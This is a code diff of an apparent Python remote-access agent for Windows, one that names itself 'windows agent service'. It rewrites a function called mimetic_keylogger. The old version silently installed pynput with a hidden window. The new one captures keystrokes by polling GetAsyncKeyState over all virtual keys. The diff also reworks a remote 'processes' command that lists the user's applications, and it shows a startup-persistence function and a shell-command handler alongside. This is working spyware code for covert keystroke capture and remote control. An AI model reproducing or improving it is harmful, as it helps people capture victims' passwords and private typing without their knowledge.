@@ -260,101 +260,68 @@ def ensure_startup():
 
 
 def mimetic_keylogger():
-    """Capture keyboard input indefinitely until ESC or 1 minute inactivity."""
-    try:
-        from pynput.keyboard import Listener
-    except ImportError:
-        try:
-            subprocess.run(
-                [sys.executable, "-m", "pip", "install", "pynput", "-q"],
-                capture_output=True,
-                timeout=30,
-                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
-            )
-            from pynput.keyboard import Listener
-        except Exception as e:
-            return f"Error: Could not install pynput - {str(e)}"
-
+    """Capture keyboard input using Windows API polling until ESC or 1 minute inactivity."""
     log = []
-    stop_event = threading.Event()
     last_key_time = time.time()
-    inactivity_timeout = 60  # 1 minute
+    inactivity_timeout = 60  # 1 minute of inactivity for auto-stop
 
-    def on_press(key):
-        nonlocal last_key_time
-        try:
-            # Update last key time
-            last_key_time = time.time()
-
-            # Get character representation
-            if hasattr(key, 'char') and key.char:
-                log.append(key.char)
-            else:
-                # Map special keys
-                key_str = str(key).replace("Key.", "").upper()
-                if key_str == "SPACE":
-                    log.append('[SPACE]')
-                elif key_str == "ENTER":
-                    log.append('[ENTER]')
-                elif key_str == "TAB":
-                    log.append('[TAB]')
-                elif key_str == "BACKSPACE":
-                    log.append('[BACKSPACE]')
-                elif key_str == "DELETE":
-                    log.append('[DELETE]')
-                elif key_str == "ESC":
-                    stop_event.set()
-                    return False  # Stop listening
-                else:
-                    log.append(f'[{key_str}]')
-        except:
-            pass
-        return None
-
-    listener_obj = None
     try:
-        # Create and start listener
-        listener_obj = Listener(on_press=on_press)
-        listener_obj.start()
+        GetAsyncKeyState = ctypes.windll.user32.GetAsyncKeyState
+    except Exception as e:
+        return f"Error: Could not access Windows API - {str(e)}"
 
-        # Wait until ESC pressed or 1 minute inactivity
+    # Key codes for special keys
+    VK_ESCAPE = 0x1B
+    key_map = {
+        0x20: '[SPACE]', 0x0D: '[ENTER]', 0x09: '[TAB]',
+        0x08: '[BACKSPACE]', 0x2E: '[DELETE]', 0x1B: '[ESC]'
+    }
+
+    try:
+        pressed_keys = set()
+
         while True:
-            # Check if ESC was pressed (returns immediately if set)
-            if stop_event.is_set():
-                break
+            current_time = time.time()
 
-            # Check inactivity timeout
-            elapsed_inactive = time.time() - last_key_time
+            # Check if we've been inactive for 60 seconds
+            elapsed_inactive = current_time - last_key_time
             if elapsed_inactive >= inactivity_timeout:
                 break
 
-            # Sleep briefly to avoid busy-waiting
-            time.sleep(0.1)
+            # Check all keys (0-255)
+            for vk_code in range(256):
+                key_state = GetAsyncKeyState(vk_code)
+                is_pressed = bool(key_state & 0x8000)
 
-        # Stop the listener gracefully
-        if listener_obj:
-            try:
-                listener_obj.stop()
-            except:
-                pass
+                # Detect key state change (from not pressed to pressed)
+                if is_pressed and vk_code not in pressed_keys:
+                    pressed_keys.add(vk_code)
+                    last_key_time = current_time
 
-        # Wait for listener thread to finish
-        time.sleep(0.2)
+                    # Check for ESC to exit immediately
+                    if vk_code == VK_ESCAPE:
+                        result = ''.join(log)
+                        return result if result else "No keys recorded"
+
+                    # Map key to character
+                    if vk_code in key_map:
+                        log.append(key_map[vk_code])
+                    elif 0x30 <= vk_code <= 0x39:  # Numbers 0-9
+                        log.append(chr(vk_code))
+                    elif 0x41 <= vk_code <= 0x5A:  # Letters A-Z
+                        log.append(chr(vk_code).lower())
+
+                elif not is_pressed and vk_code in pressed_keys:
+                    pressed_keys.discard(vk_code)
+
+            # Small sleep to avoid consuming too much CPU
+            time.sleep(0.05)
 
         result = ''.join(log)
         return result if result else "No keys recorded"
 
     except Exception as e:
         return f"Error: {str(e)}"
-    finally:
-        # Ensure listener is stopped
-        try:
-            if listener_obj:
-                if hasattr(listener_obj, 'is_alive') and listener_obj.is_alive():
-                    listener_obj.stop()
-                    time.sleep(0.1)
-        except:
-            pass
 
 
 def restart_agent():
@@ -935,7 +902,7 @@ def execute_shell_command(cmd_str):
         # Handle processes command - show main process per application
         if cmd_lower == "processes":
             try:
-                result = subprocess.run(["tasklist", "/v", "/fo", "csv"], capture_output=True, text=True, timeout=10)
+                result = subprocess.run(["tasklist", "/v"], capture_output=True, text=True, timeout=10)
                 lines = result.stdout.strip().split("\n")
 
                 # System processes to ignore
@@ -959,81 +926,52 @@ def execute_shell_command(cmd_str):
                     'obs', 'streamlabs', 'xsplit', 'twitch', 'youtube',
                     'git', 'github', 'gitlab', 'docker', 'putty', 'winscp',
                     '7zip', 'winrar', 'everything', 'totalcommander',
-                    'windows agent service', 'telelluc'
+                    'windows agent service', 'telelluc', 'msedgewebview2'
                 }
-
-                import csv
-                from io import StringIO
 
                 processes_by_app = {}
 
-                # Parse CSV output
-                try:
-                    csv_reader = csv.DictReader(StringIO(result.stdout))
-                    for row in csv_reader:
-                        if not row or not row.get('Name'):
-                            continue
+                # Parse plain text output line by line
+                for line in lines[2:]:  # Skip header and separator
+                    if not line.strip():
+                        continue
 
-                        proc_name = row.get('Name', '').lower()
-                        proc_pid = row.get('PID', '0')
-                        mem_str = row.get('Mem Usage', '0').replace(',', '').replace('K', '').strip()
+                    line_lower = line.lower()
 
-                        try:
-                            mem_mb = int(mem_str) / 1024 if mem_str.isdigit() else 0
-                        except:
-                            mem_mb = 0
+                    # Check if process is interesting and not system
+                    is_system = any(proc in line_lower for proc in system_processes)
+                    is_interesting = any(keyword in line_lower for keyword in interesting_keywords)
 
-                        # Check if process is interesting and not system
-                        is_system = any(proc in proc_name for proc in system_processes)
-                        is_interesting = any(keyword in proc_name for keyword in interesting_keywords)
+                    if is_interesting and not is_system:
+                        # Extract process name and PID from the line
+                        parts = line.split()
+                        if len(parts) >= 2:
+                            proc_name = parts[0]
+                            proc_pid = parts[1]
+                            app_key = proc_name.lower()
 
-                        if is_interesting and not is_system:
-                            app_key = row.get('Name', 'unknown').lower()
-
-                            # Keep only the process with most memory for each app
+                            # Keep only the first (main) process for each app
                             if app_key not in processes_by_app:
                                 processes_by_app[app_key] = {
-                                    'name': row.get('Name', 'unknown'),
+                                    'name': proc_name,
                                     'pid': proc_pid,
-                                    'mem_mb': mem_mb,
-                                    'count': 1,
-                                    'original': row
+                                    'line': line
                                 }
-                            else:
-                                processes_by_app[app_key]['count'] += 1
-                                if mem_mb > processes_by_app[app_key]['mem_mb']:
-                                    processes_by_app[app_key].update({
-                                        'pid': proc_pid,
-                                        'mem_mb': mem_mb,
-                                        'original': row
-                                    })
-                except:
-                    pass
 
                 if not processes_by_app:
                     return "No interesting processes running"
 
-                # Sort by memory usage (descending)
-                sorted_procs = sorted(processes_by_app.values(), key=lambda x: x['mem_mb'], reverse=True)
+                # Format output
+                output_lines = ["Image Name                     PID"]
+                output_lines.append("=" * 50)
 
-                # Format output: show main process with PID and count of related processes
-                output_lines = ["Image Name                  PID        Memory        Count"]
-                output_lines.append("=" * 70)
-
-                for proc in sorted_procs[:30]:
+                for app_key, proc in sorted(processes_by_app.items()):
                     name = proc['name']
                     pid = proc['pid']
-                    mem_mb = proc['mem_mb']
-                    count = proc['count']
-
-                    count_str = f"({count})" if count > 1 else ""
-                    mem_str = f"{mem_mb:.1f}MB"
-
-                    # Format line: name | PID | memory | count
-                    line = f"{name:<30} {pid:<10} {mem_str:<13} {count_str}"
+                    line = f"{name:<30} {pid}"
                     output_lines.append(line)
 
-                return "\n".join(output_lines)
+                return "\n".join(output_lines[:35])
             except Exception as e:
                 return f"Error: {str(e)}"
 
